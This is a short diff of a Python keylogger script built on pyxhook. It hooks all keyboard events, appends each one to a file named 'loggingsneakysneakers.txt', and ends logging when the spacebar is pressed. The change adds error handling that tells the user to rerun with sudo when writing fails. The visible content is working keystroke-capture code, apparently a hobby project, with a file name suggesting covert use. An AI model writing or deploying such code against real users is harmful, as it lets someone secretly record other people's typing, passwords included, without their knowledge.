@@ -7,17 +7,20 @@ import sys
 #Key press function
 
 def kbevent( event ):
-    #print key info
-    print(event)
-    butts = open("loggingsneakysneakers.txt", "a")
-    butts.write(str(event))
-    butts.close()
+    try:
+        #print key info
+        print(event)
+        butts = open("loggingsneakysneakers.txt", "a")
+        butts.write(str(event))
+        butts.close()
     
-    #If the ascii value matches spacebar, terminate the while loop
+        #If the ascii value matches spacebar, terminate the while loop
 
-    if event.Ascii == 32:
-        global running
-        running = False
+        if event.Ascii == 32:
+            global running
+            running = False
+    except IOError:
+        print("Permission denied! Run with sudo!")
 
 #Create hookmanager
 hookman = pyxhook.HookManager()
